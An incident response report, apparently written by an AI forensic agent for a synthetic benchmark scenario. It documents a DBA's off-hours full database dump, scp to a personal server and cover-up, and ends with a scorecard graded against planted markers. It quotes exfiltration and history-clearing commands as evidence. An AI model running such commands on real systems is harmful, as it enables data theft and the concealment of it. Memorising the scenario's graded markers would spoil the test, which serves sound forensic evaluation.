# Incident Response Report — db-prod-01
## Scenario 11: Insider Data Exfiltration

| Field | Value |
|-------|-------|
| **Case** | attack-scenario-11-insider |
| **Host** | db-prod-01 |
| **Analyst** | FindEvil / Claude IR Agent |
| **Report Date** | 2026-04-23 (UTC) |
| **Classification** | CONFIRMED — Insider Data Exfiltration |

---

## Executive Summary

A legitimate DBA account (`alice`) performed an unauthorized full database dump and exfiltrated the compressed archive to a **personal, non-corporate server** (`home.malan-personal.net`) at **02:14 UTC on 2026-04-15** — well outside normal business hours. The attacker then deleted the local artifact and cleared shell history to cover their tracks. No external attacker was involved. Every individual action used alice's legitimate credentials and standing sudo privileges. The compromise is identified by the aggregate pattern: off-hours timing, full-database scope, transfer to personal infrastructure, and deliberate anti-forensic cleanup.

**Verdict: Confirmed insider data exfiltration by user `alice`.**

---

## Evidence Inventory

| Artifact | Path | Notes |
|----------|------|-------|
| Auth log | `evidence/attack-scenario-11-insider/auth.log` | 24 lines, 2026-04-14 – 2026-04-15 |
| Bash history | `fs/home/alice/.bash_history` | 19 commands, no timestamps |
| SSH client config | `fs/home/alice/.ssh/config` | Documents personal server |
| sudoers include | `fs/etc/sudoers.d/dba` | Two alice rules — one is NOPASSWD:ALL |
| sshd_config | `fs/etc/ssh/sshd_config` | Restrictive; key-auth only |
| passwd / shadow | `fs/etc/passwd`, `fs/etc/shadow` | 3 interactive accounts |

---

## Findings

### F-01 · Off-Hours Full Database Dump (CRITICAL)

**Source:** `auth.log` lines 13–21 + `bash_history` lines 12–15

At **2026-04-15 02:14:08 UTC**, alice authenticated to db-prod-01 from `10.0.2.15` using her normal workstation key (`ED25519 SHA256:aliceNormalWorkstationKey…`). Within 34 seconds she executed:

```
sudo mysqldump --all-databases --single-transaction  >  /tmp/dump-20260415.sql
sudo gzip /tmp/dump-20260415.sql
sudo chmod 644 /tmp/dump-20260415.sql.gz
sudo chown alice:alice /tmp/dump-20260415.sql.gz
```

The session lasted **3 minutes 50 seconds** (02:14:08 – 02:17:58 UTC) — a precisely scoped, rapid operation consistent with a rehearsed exfiltration, not routine DBA work. The `--all-databases` flag captures every schema on the server, not a targeted operational backup.

**Anomaly signals:**
- 02:14 UTC = off-hours (approximately 10 PM US East / business hours over in most EU zones)
- Duration of 3:50 is unusually short for a complete database dump cycle
- `chmod 644` + `chown alice:alice` deliberately transfers ownership of a root-created file to alice, enabling the subsequent non-sudo `scp`

**Contrast with normal activity:** alice's prior session (2026-04-14 09:02–09:04 UTC, workday) consisted of a single `systemctl status mysql` check and logout. The April 15 session has a fundamentally different operational profile.

---

### F-02 · Exfiltration to Personal Infrastructure (CRITICAL)

**Source:** `bash_history` line 17 + `fs/home/alice/.ssh/config`

```bash
scp -i ~/.ssh/personal_ed25519 dump-20260415.sql.gz \
    alice@home.malan-personal.net:/srv/backup/corp-db/
```

The destination `home.malan-personal.net` is explicitly documented in alice's SSH client config with the comment **`# personal ssh config — not corporate`** and uses a personal identity key (`personal_ed25519`) on a non-standard port (2222). This is unambiguously personal, non-corporate infrastructure. The remote path `/srv/backup/corp-db/` suggests a pre-staged, purposely named destination.

**This transfer is not logged in `auth.log`** — `auth.log` records only local PAM/sshd events. The transfer occurred as alice's own UID after the `chown`, so it requires no further privilege escalation and leaves no local server-side record beyond the bash history alice attempted to destroy.

---

### F-03 · Anti-Forensic Cover-Up (HIGH)

**Source:** `bash_history` lines 18–19

Immediately after the transfer, alice:

```bash
rm dump-20260415.sql.gz        # destroys local artifact
history -c                      # clears in-memory shell history
```

The `history -c` command clears the in-memory history buffer, which on logout would have overwritten `~/.bash_history` — preventing recovery of the session commands. However, because the file was written to disk before the `history -c` took full effect (or the shell exited abnormally), the history file survived with all 19 commands intact.

The attempt to conceal activity is itself a strong indicator of malicious intent. Legitimate backup operations do not delete the archive immediately after transfer or clear shell history.

---

### F-04 · Sudoers Misconfiguration Enabled the Attack (HIGH)

**Source:** `fs/etc/sudoers.d/dba`

```
alice ALL=(root) NOPASSWD: /usr/bin/systemctl status mysql, /usr/bin/systemctl restart mysql
alice ALL=(root) NOPASSWD: ALL
```

The second rule is a `NOPASSWD: ALL` grant — full passwordless root on any command. The file comment acknowledges this was flagged on post-review as "too broad." This misconfiguration was the necessary enabler: without it, alice could not have run `mysqldump`, `gzip`, `chmod`, or `chown` as root without a password prompt that would appear in PAM logs and require her credentials at the time of the action.

This is a **pre-existing misconfiguration**, not planted by the attacker — but the attacker selected this host because it existed.

---

### F-05 · No External Compromise Indicators

**Source:** `auth.log` full review

- **Failed logins:** 0
- **Unknown source IPs:** 0 (all logins from known internal addresses: `10.0.2.15` alice, `10.0.2.22` bob)
- **New user accounts:** 0
- **New persistence mechanisms:** 0 (no cron, no systemd units, no authorized_keys additions, no LD_PRELOAD)
- **Webshells / malware:** 0

There is no external attacker. No account was created, no backdoor was planted, and no lateral movement occurred. This is a pure insider scenario.

---

## Attack Timeline

```
2026-04-14 09:02:11 UTC  alice logs in from 10.0.2.15 (publickey)
2026-04-14 09:02:30 UTC  sudo systemctl status mysql  ← normal DBA check
2026-04-14 09:04:15 UTC  alice logs out (session: 2 min — routine)

2026-04-14 13:18:07 UTC  bob logs in from 10.0.2.22
2026-04-14 13:20:44 UTC  bob: sudo apt update
2026-04-14 13:22:10 UTC  bob logs out

    ═══ OFF-HOURS EXFILTRATION WINDOW ═══

2026-04-15 02:14:08 UTC  alice logs in from 10.0.2.15 (same key) ← OFF-HOURS
2026-04-15 02:14:42 UTC  sudo mysqldump --all-databases --single-transaction > /tmp/dump-20260415.sql
2026-04-15 02:16:21 UTC  sudo session closed (dump complete)
2026-04-15 02:16:45 UTC  sudo gzip /tmp/dump-20260415.sql
2026-04-15 02:17:05 UTC  sudo chmod 644 /tmp/dump-20260415.sql.gz
2026-04-15 02:17:22 UTC  sudo chown alice:alice /tmp/dump-20260415.sql.gz
[no auth.log entry]      scp dump-20260415.sql.gz → alice@home.malan-personal.net:/srv/backup/corp-db/
[no auth.log entry]      rm dump-20260415.sql.gz
[no auth.log entry]      history -c
2026-04-15 02:17:58 UTC  alice logs out (session: 3 min 50 sec)
```

---

## Cross-Source Correlation

This case requires cross-referencing two independent sources to see the full picture:

| Signal | Source | What it shows |
|--------|--------|---------------|
| Off-hours login + mysqldump + chmod/chown | `auth.log` | Dump created and ownership transferred |
| scp to personal server | `bash_history` | Destination and identity key |
| Personal server label | `~/.ssh/config` | Non-corporate nature of destination confirmed |
| rm + history -c | `bash_history` | Deliberate cover-up |

**`auth.log` alone looks like unusual but possibly legitimate DBA activity.** **`bash_history` alone shows an scp with no obvious context.** Only together do they reveal the complete exfiltration chain. This is the core difficulty of insider threat detection: each artifact is individually ambiguous; the correlation is damning.

---

## Indicators of Compromise

| IOC | Type | Context |
|-----|------|---------|
| `home.malan-personal.net` | Domain | Personal exfil destination |
| `/srv/backup/corp-db/` | Remote path | Pre-staged exfil directory |
| `~/.ssh/personal_ed25519` | SSH key | Personal identity, not corporate |
| `/tmp/dump-20260415.sql.gz` | Filename | Database dump (deleted post-exfil) |
| `2026-04-15 02:14–02:17 UTC` | Time window | Off-hours exfil session |

---

## Impact Assessment

| Dimension | Assessment |
|-----------|-----------|
| **Data at risk** | All databases on db-prod-01 (`--all-databases`) |
| **Confidentiality** | **CRITICAL** — complete database contents exfiltrated |
| **Integrity** | No modification of production data observed |
| **Availability** | Not impacted |
| **Regulatory** | Potential GDPR / PCI-DSS / HIPAA notification obligations depending on database contents |

---

## Recommendations

### Immediate

1. **Disable alice's account** and revoke SSH keys pending HR/legal review.
2. **Identify database contents** — determine what customer, financial, or PII data was in the dump and assess notification obligations.
3. **Contact legal/HR** — this is an insider threat requiring disciplinary and potentially criminal referral.
4. **Attempt takedown or preservation order** for `home.malan-personal.net` if feasible; preserve DNS/WHOIS records now.
5. **Audit other sessions** — review full auth log retention; this evidence covers only 2 days. Determine if prior exfiltration sessions occurred.

### Short-Term (1–2 Weeks)

6. **Remediate sudoers misconfiguration** — remove the `NOPASSWD: ALL` rule for alice and all other DBA accounts. Replace with least-privilege grants scoped to specific backup commands on specific days/times if needed.
7. **Implement egress controls** — db-prod-01 should not be able to initiate outbound `scp`/`ssh` to arbitrary internet hosts. Firewall outbound port 2222 and restrict SSH egress to corporate jump hosts only.
8. **Deploy SIEM alerting** for: off-hours logins to database servers, `mysqldump --all-databases`, `history -c` execution, and outbound SCP/SFTP to non-corporate hosts.
9. **Enable bash audit logging** (`PROMPT_COMMAND` + `auditd`) so shell commands are captured independently of `~/.bash_history`.

### Long-Term

10. **Privileged Access Management (PAM)** — database dump operations should go through an approved workflow with logging, not ad-hoc sudo.
11. **Data Loss Prevention (DLP)** — monitor for large file transfers from production servers.
12. **Insider threat program** — anomaly detection on after-hours access + bulk data operations.

---

## Confidence Assessment

| Finding | Confidence | Basis |
|---------|-----------|-------|
| alice performed the mysqldump | **HIGH** | auth.log sudo record, line 15 |
| dump was transferred to personal server | **HIGH** | bash_history line 17 (survived history -c) |
| destination is personal, non-corporate | **HIGH** | ~/.ssh/config explicit comment |
| intentional cover-up attempted | **HIGH** | rm + history -c immediately post-transfer |
| no external attacker involved | **HIGH** | Zero failed logins, zero unknown IPs, zero new accounts |
| this was malicious, not accidental | **HIGH** | Off-hours timing + full-DB scope + cover-up = intent |

---

*Report generated by FindEvil IR Agent · Evidence read-only · Chain of custody maintained*

---

<!-- scorecard:start -->

## Verification scorecard

Mechanically computed by `scripts/grade_example_reports.py` against the
`agent_guard.SCENARIOS["11"]` markers (case-insensitive substring
match, identical logic to `tests/harness/agent_guard.py`'s grade()
function). No AI self-assessment is involved in these numbers.

| Metric | Score | % |
|---|---|---|
| Required markers found | 3/3 | **100%** |
| Cross-scenario markers absent | 10/10 | **100%** |
| Verdict-correctness confidence | — | **100%** |
| Hallucination-free confidence | — | **100%** |

**Overall confidence: HIGH** — every planted marker for this
scenario was surfaced in the report, and zero markers from any other
scenario leaked in. Re-grade with `python scripts/grade_example_reports.py`.

<!-- scorecard:end -->
